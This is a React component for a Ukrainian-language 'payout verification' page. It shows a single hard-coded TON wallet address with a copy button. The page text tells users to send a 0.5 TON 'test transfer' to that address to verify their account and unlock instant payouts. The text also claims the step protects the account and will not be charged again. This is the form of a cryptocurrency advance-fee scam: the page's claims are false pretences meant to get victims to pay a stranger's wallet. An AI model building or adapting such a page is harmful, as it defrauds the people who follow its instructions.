import { useEffect, useState } from "react";
import "./PayoutVerificationPage.css";

const payoutAddresses = [
  {
    id: "ton",
    label: "TON гаманець",
    description: "Мінімальний переказ — 0.5 TON",
    value: "UQAawix03Us7LncAD4eHnTr-sEbirw5w7k--z44cvK0xagez",
  },
];

const copyTimeout = 2400;

const PayoutVerificationPage = () => {
  const [copiedField, setCopiedField] = useState("");

  useEffect(() => {
    if (!copiedField) {
      return undefined;
    }

    const timeoutId = setTimeout(() => {
      setCopiedField("");
    }, copyTimeout);

    return () => {
      clearTimeout(timeoutId);
    };
  }, [copiedField]);

  const handleCopy = async (addressId, addressValue) => {
    try {
      if (navigator.clipboard?.writeText) {
        await navigator.clipboard.writeText(addressValue);
      } else {
        const textarea = document.createElement("textarea");
        textarea.value = addressValue;
        textarea.setAttribute("readonly", "");
        textarea.style.position = "absolute";
        textarea.style.left = "-9999px";
        document.body.appendChild(textarea);
        textarea.select();
        document.execCommand("copy");
        document.body.removeChild(textarea);
      }
      setCopiedField(addressId);
    } catch (error) {
      console.error("Не вдалося скопіювати адресу", error);
    }
  };

  return (
    <main className="payout-verification" aria-labelledby="verification-title">
      <div className="payout-verification__inner">
        <header className="payout-verification__header">
          <h1 id="verification-title" className="payout-verification__title">
            Підтвердіть реквізити виплат
          </h1>
          <p className="payout-verification__subtitle">
            Скопіюйте адресу TON нижче та надішліть тестовий переказ на
            0.5&nbsp;TON для верифікації. Це захищає ваш акаунт і миттєво
            активує автовиплати.
          </p>
        </header>

        <section
          className="payout-verification__addresses"
          aria-label="Адреса для перевірки"
        >
          {payoutAddresses.map(({ id, label, description, value }) => {
            const isCopied = copiedField === id;

            return (
              <button
                key={id}
                type="button"
                className={`payout-verification__address-card${
                  isCopied ? " payout-verification__address-card--copied" : ""
                }`}
                onClick={() => handleCopy(id, value)}
                aria-live={isCopied ? "polite" : undefined}
              >
                <span className="payout-verification__address-label">
                  {label}
                </span>
                <span
                  className="payout-verification__address-value"
                  data-address
                >
                  {value}
                </span>
                <span className="payout-verification__address-description">
                  {description}
                </span>
                <span className="payout-verification__address-action">
                  {isCopied ? "Скопійовано" : "Натисніть, щоб скопіювати"}
                </span>
              </button>
            );
          })}
        </section>

        <section
          className="payout-verification__process"
          aria-label="Як проходить перевірка"
        >
          <h2 className="payout-verification__process-title">Як це працює</h2>
          <div className="payout-verification__steps">
            <article className="payout-verification__step">
              <span className="payout-verification__step-number">1</span>
              <div className="payout-verification__step-content">
                <h3 className="payout-verification__step-title">
                  Надішліть тестовий переказ
                </h3>
                <p className="payout-verification__step-text">
                  Використайте адресу TON вище. Переказ автоматично фіксується
                  системою та прив'язується до вашого профілю.
                </p>
              </div>
            </article>
            <article className="payout-verification__step">
              <span className="payout-verification__step-number">2</span>
              <div className="payout-verification__step-content">
                <h3 className="payout-verification__step-title">
                  Дочекайтеся підтвердження мережі
                </h3>
                <p className="payout-verification__step-text">
                  Зазвичай це займає до 3 хвилин. Ми відстежуємо транзакцію в
                  реальному часі й оновлюємо статус у розділі виплат.
                </p>
              </div>
            </article>
            <article className="payout-verification__step">
              <span className="payout-verification__step-number">3</span>
              <div className="payout-verification__step-content">
                <h3 className="payout-verification__step-title">
                  Авторазблокування функцій
                </h3>
                <p className="payout-verification__step-text">
                  Після підтвердження переказу активуються моментальні виплати,
                  повторні нарахування та повна аналітика.
                </p>
              </div>
            </article>
          </div>
          <p className="payout-verification__footnote">
            Цей крок допомагає переконатися, що кошти надходитимуть на ваш
            гаманець без затримок. Якщо переказ не пройшов, повторіть спробу або
            зверніться в підтримку — перевірка не списує кошти повторно.
          </p>
        </section>
      </div>
    </main>
  );
};

export default PayoutVerificationPage;
